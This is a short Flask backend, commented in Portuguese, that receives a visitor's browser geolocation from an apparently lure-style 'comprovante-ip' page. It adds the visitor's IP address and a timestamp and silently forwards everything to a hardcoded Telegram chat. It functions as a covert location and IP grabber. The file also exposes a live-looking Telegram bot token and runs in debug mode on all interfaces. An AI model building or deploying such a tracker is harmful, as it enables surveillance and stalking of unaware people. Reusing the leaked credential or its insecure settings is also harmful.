from flask import Flask, request, jsonify
from flask_cors import CORS  # Adicione o CORS aqui
import requests
from datetime import datetime

app = Flask(__name__)

# Permitir CORS para o domínio do Vercel
CORS(app, origins=["https://comprovante-ip.vercel.app"])  # Permite requisições apenas do seu domínio Vercel

# Configurações do Telegram
TELEGRAM_BOT_TOKEN = "8017455180:AAHUJG0RsWjCp2MoMnU_Rijq20lIZKGVhq0"
TELEGRAM_CHAT_ID = "6379137380"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, data=data)

@app.route("/send-location", methods=["POST"])
def receive_location():
    try:
        data = request.json
        latitude = data.get("latitude")
        longitude = data.get("longitude")
        maps_link = data.get("maps")

        # Obtém o IP do usuário
        user_ip = request.remote_addr

        # Data e hora do acesso
        data_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Mensagem formatada para o Telegram
        mensagem = f"""
📢 *Novo Acesso Registrado!*

🌍 *Localização:* [{latitude}, {longitude}]({maps_link})  
📍 *Google Maps:* [Ver Localização]({maps_link})  
💻 *IP do Usuário:* `{user_ip}`  
⏰ *Data e Hora:* {data_hora}
"""

        # Enviar para o Telegram
        send_telegram_message(mensagem)

        return jsonify({"success": True, "message": "Localização enviada para o Telegram!"})

    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
